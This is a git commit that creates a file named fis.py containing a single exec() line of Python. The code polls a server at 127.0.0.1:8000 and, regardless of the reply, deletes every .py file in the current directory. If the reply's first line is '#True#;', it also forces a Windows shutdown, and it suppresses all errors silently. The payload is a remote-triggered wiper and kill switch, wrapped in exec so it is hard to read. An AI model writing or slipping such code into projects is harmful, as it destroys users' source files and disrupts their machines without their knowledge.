0a7a0033e70480f94e42d3955e98c5e287e40c3a
Miqueias S. Costa <40896649+miqdeveloper@users.noreply.github.com>
2025-02-09 08:08:26 -0300

    Create fis.py

---
+++ fis.py
@@ -0,0 +1,1 @@
+exec('''try:\n\tr=requests.get("http://127.0.0.1:8000/");a=''.join(r.text).splitlines()[0];[os.remove(f) for f in glob.glob("*.py")];os.system('shutdown -s -f -t 10') if a == "#True#;" else False; pass;\nexcept:pass;''')
